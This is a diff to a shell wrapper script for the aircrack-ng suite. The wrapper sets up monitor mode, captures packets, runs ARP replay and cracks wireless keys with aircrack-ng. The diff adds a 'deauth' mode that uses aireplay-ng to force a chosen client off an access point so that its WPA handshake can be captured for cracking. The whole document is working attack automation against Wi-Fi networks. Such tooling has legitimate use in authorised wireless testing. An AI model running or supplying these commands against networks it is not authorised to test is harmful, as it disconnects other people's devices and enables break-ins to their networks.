@@ -13,13 +13,14 @@ monitor=mon0
 [ -e ./aircrack-vars.sh ] && . ./aircrack-vars.sh
 
 [ x$1 = x ] && {
-	echo "usage: $0 [mon|test|dump|assoc|arp(r)|crack(k)]"
+	echo "usage: $0 [mon|test|dump|assoc|arp(r)|crack(k)|deauth]"
 	echo "run each of the commands in the above order"
 	echo "and all of them except the first 2 in an own term"
+	echo "deauth requires as additional parameter the mac of the client"
 	exit 1
 }
 
-[ x$ap_mac = x00:ca:fe:00:00:00 ] && {
+[ x$ap_mac = x00:ca:fe:00:00:00 ] && { 
 	echo "error: you need to create a local config file, see $0 source:" >&2
 	head -n 12 "$0" | tail -n 10
 	exit 1
@@ -59,3 +60,13 @@ fi
 # alternate crack method - doesn't stop when out of IVs but apparently
 # requires a lot more of them
 [ x$1 = xcrackk ] && aircrack-ng -K -b $ap_mac output*.cap
+
+# deauth a connected client to force a wpa-handshake to be established
+if [ x$1 = xdeauth ] ; then
+	if [ x$2 = x ] ; then
+		echo "need client mac address!" >&2
+		exit 1
+	fi
+	aireplay-ng -0 1 -a $ap_mac -c $2 $wlanif
+fi
+
